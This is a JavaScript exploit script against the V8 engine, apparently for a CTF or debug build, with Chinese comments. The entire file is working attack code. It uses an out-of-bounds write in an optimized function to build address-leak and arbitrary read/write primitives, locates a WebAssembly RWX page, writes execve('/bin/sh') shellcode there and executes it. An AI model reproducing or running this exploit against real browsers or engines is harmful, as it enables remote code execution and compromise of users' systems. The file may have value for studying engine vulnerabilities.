class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    d2u(val){       //double ==> Uint64
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2d(val){       //Uint64 ==> double
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}
function hex(x)                             //打印16进制
{
   return '0x' + (x.toString(16)).padStart(16, 0);
}

var mem = new Memory();

function fun(arg) {
  let x = arguments.length;
  a1 = new Array(0x10);
  a1[0] = 1.1;
  a2 = new Array(0x10);
  a2[0] = 1.1;
  a1[(x >> 16) * 41] = 1.39064994160909e-309;  // 0x2a00000000
}
var a1, a2;
var a3 = [1.1, 2.2];
a3.length = 0x11000;
a3.fill(3.3);
//var a4 = [1.1];
for (let i = 0; i < 3; i++) fun(1);
%OptimizeFunctionOnNextCall(fun);
//fun(...a4);
res = fun(...a3);
//assertEquals(16, a2.length);
console.log(a2.length);
let obj = {'a': 0x4321, 'b': 0x9999};
var buf = new ArrayBuffer(0xbeef);
let obj_offset = 0;
for(let i = 0; i < 0xffff; i++){
    let val = mem.d2u(a2[i]);
    if(val === 0x432100000000){
        console.log("obj_offset: " + i.toString());
        a2[i] = mem.u2d(0x567800000000);
        obj_offset = i;
        break;
    }
}
let buf_offset = 0;
for(let i = 0; i < 0xffff; i++){
    let val = mem.d2u(a2[i]);
    if(val === 0xbeef){
        console.log("buf_offset: " + i.toString());
        buf_offset = i;
        a2[i] = mem.u2d(0x121200000000);
        break;
    }
}
class arbitraryRW{
    constructor(buf_offset, obj_offset){
        this.buf_offset = buf_offset;
        this.obj_offset = obj_offset;
    }
    leak_obj(objs){
        obj.a = objs;                     //修改obj.a的值为目标对象
        return mem.d2u(a2[this.obj_offset]) - 1;  //读出属性a的值，因为oobArray是以double的格式读出，所以需要转换为Uint64
    }
    read(addr){                 
        let idx = this.buf_offset;
        a2[idx + 1] = mem.u2d(addr);              //修改BackingStore指针指向目标地址
        //oobArray[idx + 2] = mem.u2d(addr);              //修改BitField指针指向目标地址（因为调试发现该值总和BackingStore相同）
        let tmp = new Float64Array(buf, 0, 0x10);
        return mem.d2u(tmp[0]);
    }
    write(addr, val){
        let idx = this.buf_offset;
        a2[idx + 1] = mem.u2d(addr);
        //oobArray[idx + 2] = mem.u2d(addr);
        let tmp = new Uint8Array(buf, 0, 0x10)
        tmp[0] = val;                     //将欲存储的Uint64值转为double形式写入
    }
}

var arw = new arbitraryRW(buf_offset,obj_offset);
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,10,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
let leak_f = arw.leak_obj(f);
let share_info = arw.read(leak_f+0x18)-1;
let data = arw.read(share_info+0x8)-1;
let instance = arw.read(data+0x10)-1;
let rwx_addr = arw.read(instance+0xe8);

console.log(hex(leak_f));
console.log(hex(rwx_addr));
let shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x4d\x31\xd2\x0f\x05";
for(var i = 0; i < shellcode.length;i++){
    var value = shellcode[i];       
    arw.write(rwx_addr+i,value.charCodeAt());
}

f();
%SystemBreak();